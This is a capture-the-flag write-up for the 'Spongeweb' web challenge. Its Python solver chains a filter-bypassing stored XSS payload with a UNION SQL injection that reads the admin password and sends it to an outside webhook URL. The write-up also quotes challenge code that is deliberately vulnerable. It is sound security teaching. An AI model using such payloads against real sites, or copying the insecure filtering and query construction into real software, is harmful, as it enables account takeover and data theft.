# Spongeweb

## Description

> I really like hacking.
> I really like privacy.
> And I really like spongebob.
> I combined all of them and created an anonymous sharing platform with html support. Feel free to share payloads, malware and stolen credit cards ;).
>
> Btw it's called spongeweb but it has nothing to do with this.
>
> Site: <http://spongeweb.challs.srdnlen.it>
>
> Attachments: spongeweb.zip

<details><summary>spongeweb.zip archive</summary>

```console
$ unzip -t spongeweb.zip
Archive:  spongeweb.zip
    testing: src/                     OK
    testing: src/bot/                 OK
    testing: src/bot/bot.js           OK
    testing: src/bot/Dockerfile       OK
    testing: src/bot/index.js         OK
    testing: src/bot/package.json     OK
    testing: src/bot/views/           OK
    testing: src/bot/views/index.ejs   OK
    testing: src/challenge/           OK
    testing: src/challenge/app.py     OK
    testing: src/challenge/Dockerfile   OK
    testing: src/challenge/schema.sql   OK
    testing: src/challenge/static/    OK
    testing: src/challenge/static/admin-style.css   OK
    testing: src/challenge/static/gifs/   OK
    testing: src/challenge/static/gifs/alright.gif   OK
    testing: src/challenge/static/gifs/blabla.gif   OK
    testing: src/challenge/static/gifs/fire.gif   OK
    testing: src/challenge/static/gifs/spongebob.gif   OK
    testing: src/challenge/static/gifs/wave.gif   OK
    testing: src/challenge/static/style.css   OK
    testing: src/challenge/templates/   OK
    testing: src/challenge/templates/adminPanel.html   OK
    testing: src/challenge/templates/base.html   OK
    testing: src/challenge/templates/error.html   OK
    testing: src/challenge/templates/index.html   OK
    testing: src/challenge/templates/login.html   OK
    testing: src/challenge/templates/thread.html   OK
    testing: src/docker-compose.yaml   OK
    testing: src/proxy.conf           OK
No errors detected in compressed data of spongeweb.zip.
```

</details>

## Setup

```bash
cd src
sed -i -e 's/spongeweb.challs.srdnlen.it/app/g' -e 's|\.\*\$$|.*$$|' docker-compose.yaml
sed -i -e 's/web-spongeweb-bot/bot/' -e 's/web-spongeweb-app/app/' proxy.conf
docker-compose up --build
```

## solver.py

```python
import requests

# BASE_URL = "http://spongeweb.challs.srdnlen.it"
BASE_URL = "http://localhost"

# APP_URL = BASE_URL
APP_URL = "http://app"

WEBHOOK_URL = "https://webhook.site/<your webhook>"


def create_thread(s: requests.Session) -> str:
    payload = f"""
    <s<script>a</script>cript>
    fetch("{APP_URL}/admin?query=threads+UNION+SELECT+password+FROM+users;")
        .then(resp => resp.text())
        .then(data => {{
            return fetch('{WEBHOOK_URL}/?data='+btoa(data));
        }});
    </script>
    """

    data = {"title": "dummy", "thread": payload}

    resp = s.post(f"{BASE_URL}/thread", data=data, allow_redirects=False)
    thread_path = resp.headers["Location"]

    return thread_path


def report(s: requests.Session, thread_path: str):
    data = {"url": f"{APP_URL}{thread_path}"}
    s.post(f"{BASE_URL}/report/", data=data)


def main():
    s = requests.Session()
    # s.proxies = {"http": "http://127.0.0.1:8080"}

    thread_path = create_thread(s)
    report(s, thread_path)


if __name__ == "__main__":
    main()
```

```console
$ python3 solver.py

$ # check the Webhook URL response and get the `data` query string value by base64 encoded

$ BASE64=PCFkb2N0eXBlIGh0bWw+CjxodG1sPgoKPGhlYWQ+Cgk8dGl0bGU+QWRtaW4gUGFuZWw8L3RpdGxlPgoJPGxpbmsgcmVsPSJzdHlsZXNoZWV0IiBocmVmPSIvc3RhdGljL2FkbWluLXN0eWxlLmNzcyI+Cgk8bGluayByZWw9Imljb24iIGhyZWY9ImRhdGE6O2Jhc2U2NCxpVkJPUncwS0dnbz0iPgo8L2hlYWQ+Cgo8Ym9keT4KCQo8aDE+QWRtaW4gUGFuZWw8L2gxPgo8Zm9ybSBtZXRob2Q9ImdldCIgYWN0aW9uPSIvYWRtaW4iPgoJPGxhYmVsPkFuYWx5dGljczwvbGFiZWw+Cgk8aW5wdXQgdHlwZT0idGV4dCIgbmFtZT0icXVlcnkiPjxicj4KCTxpbnB1dCB0eXBlPSJzdWJtaXQiIHZhbHVlPSJTZWFyY2giPgo8L2Zvcm0+CiAgICAKPGgxPlJlc3VsdDwvaDE+CgoJPGgyPnRocmVhZHMgVU5JT04gU0VMRUNUIHBhc3N3b3JkIEZST00gdXNlcnM7IDogNzwvaDI+CgkKCTxoMj50aHJlYWRzIFVOSU9OIFNFTEVDVCBwYXNzd29yZCBGUk9NIHVzZXJzOyA6IHNyZG5sZW57WFNTU19jcjBTc19TMVQzX3NQMG5HM3dFYl9TUUxpfTwvaDI+CgkKCjxmb3JtIG1ldGhvZD0iZ2V0IiBhY3Rpb249Ii9sb2dvdXQiPgoJPGlucHV0IHR5cGU9InN1Ym1pdCIgdmFsdWU9IkxvZ291dCI+CjwvZm9ybT4KCgoJCgkKCQo8L2JvZHk+Cgo8L2h0bWw+

$ echo ${BASE64} | base64 -d | grep -Eo 'srdnlen{.*}'
srdnlen{XSSS_cr0Ss_S1T3_sP0nG3wEb_SQLi}
```

## Solution

Summary:

- Stored XSS in POST /thread endpoint
- SQLi in /admin endpoint

```sql
-- schema.sql
INSERT INTO users (username, password) VALUES ('admin', 'srdnlen{REDACTED}');
```

The flag is admin user's password in the db.

```nginx
# proxy.conf
server {
    listen 80;
    absolute_redirect off;

    location /report/ {
        proxy_pass http://bot/;
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
    }

    location / {
        proxy_pass http://app/;
    }
}
```

```js
// bot.js
    bot: async (urlToVisit) => {
        const browser = await initBrowser;
        const context = await browser.createIncognitoBrowserContext()
        try {
            // Goto main page
            const page = await context.newPage();
            // login
            console.log('connecting')
            await page.goto(CONFIG.APPLOGINURL, {
                waitUntil: 'networkidle2'
            });
            console.log(page.url())
            await page.waitForSelector('#inputUsername', { timeout: 5000 })
            console.log('username')
            await page.focus('#inputUsername')
            await page.keyboard.type(USERNAME)
            console.log('password')
            await page.focus('#inputPassword')
            await page.keyboard.type(PASSWORD)
            console.log('submit')
            await page.click('#submit')
            console.log('submitted')
            await page.setExtraHTTPHeaders({
                'ngrok-skip-browser-warning': '1'
            })
            // Visit URL from user
            console.log(`bot visiting ${urlToVisit}`)
            await page.goto(urlToVisit, {
                waitUntil: 'networkidle2'
            });
            await page.waitForTimeout(5000);

            // Close
            console.log("browser close...")
            await context.close()
            return true;
```

When we access the /report/ path, it executes bot.js.
In bot.js, it accesses /login with the admin's credential and accesses the URL sent by the user.

```python
# app.py
@app.route('/thread', methods=['POST'])
def thread():
    if 'title' in request.form and 'thread' in request.form:
        title = request.form['title']
        thread = request.form['thread']
        thread = re.sub(r"<script[\s\S]*?>[\s\S]*?<\/script>", "", thread, flags=re.IGNORECASE)
        thread = re.sub(r"<img[\s\S]*?>[\s\S]*?<\/img>", "", thread, flags=re.IGNORECASE)
        thread_uuid = str(uuid4())
        cur = get_db().cursor()
        cur.execute("INSERT INTO threads ( id, title, thread) VALUES ( ?, ?, ?)", (thread_uuid, title, thread))
        get_db().commit()
        cur.close()
        return redirect(url_for('view', id=thread_uuid))
    return redirect(url_for('home')) , 400
```

We can bypass `<script>` and `<img>` tag filter, for example, by using `<s<script>a</script>cript>`, because it is replaced only once.
Thus, we can insert an arbitrary JavaScript into a thread in the DB.

```python
# app.py
@app.route('/admin', methods=['GET', 'POST'])
def admin():
    if 'username' not in session:
        return redirect(url_for('login'))
    #view analytics
    if 'query' in request.args:
        query = request.args.get('query')
        try:
            cur = get_db().execute("SELECT count(*) FROM {0}".format(query))
        except:
            return render_template('adminPanel.html') , 500
        result = cur.fetchall()
        cur.close()
        return render_template('adminPanel.html', result=result, param=query)
    else:
        return render_template('adminPanel.html')
```

```html+jinja
{# adminPanel.html #}
{% if param %}
<h1>Result</h1>
{% for i in result %}
    <h2>{{param}} : {{i[0]}}</h2>
    {% endfor %}
{% endif %}
```

The /admin endpoint has a SQL Injection.
If the `query` query string in the URL is `threads UNION SELECT password FROM users;`, then the executed sql query is `SELECT count(*) FROM threads UNION SELECT password FROM users;`.
As a result, the result variable is populated with `[[<record num>], [<admin's password>]]` array, and the flag - admin's password - is output to HTML.
Therefore, by making the bot send a request to the /admin page with SQLi payload and by sending its response to the Webhook URL which we have prepared, we can get the flag.
